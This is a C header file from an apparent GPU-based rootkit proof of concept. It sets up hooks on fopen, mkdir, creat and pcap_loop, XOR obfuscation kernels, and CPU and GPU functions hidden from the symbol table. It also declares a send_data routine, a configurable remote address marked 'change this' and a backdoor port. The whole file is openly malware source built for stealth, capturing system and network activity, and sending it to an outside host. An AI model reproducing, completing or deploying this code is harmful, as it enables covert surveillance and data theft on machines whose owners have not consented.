#define _GNU_SOURCE
#ifndef __KIT_H__
#define __KIT_H__

#include <CL/cl.h>

#define __JELLYFISH__ "kit.cl"
#define __JELLYXOR__ "xor.cl"

#define VRAM_LIMIT 3495253  // 10mb divided by 3 gpu kernels
#define ADDRESS "1.1.1.1"  // change this
#define PORT 8771  // sample backdoor port for PoC

// gpu functions
#define log_fopen "log_fopen"
#define log_mkdir "log_mkdir"
#define log_creat "log_creat"
#define jelly_xor "jelly_xor"

// syscalls
#define SYS_FOPEN 0
#define SYS_MKDIR 1
#define SYS_CREAT 2
#define SYS_PCAP_LOOP 3
#define SYSCALL_SIZE 4

typedef struct syscall_struct{
    void *(*syscall_func)();
} s_calls;

s_calls syscalls[SYSCALL_SIZE];

// hidden gpu functions
cl_device_id create_device(void) __attribute__((visibility("hidden")));
cl_program build_program(cl_context ctx, cl_device_id dev, const char *filename) __attribute__((visibility("hidden")));
cl_context create_ctx(const cl_device_id *dev) __attribute__((visibility("hidden")));

// hidden cpu functions
void jelly_init(void) __attribute__((visibility("hidden")));
static void limit_buf(char *buffer) __attribute__((visibility("hidden")));
static void send_data(char *buffer) __attribute__((visibility("hidden")));

#endif
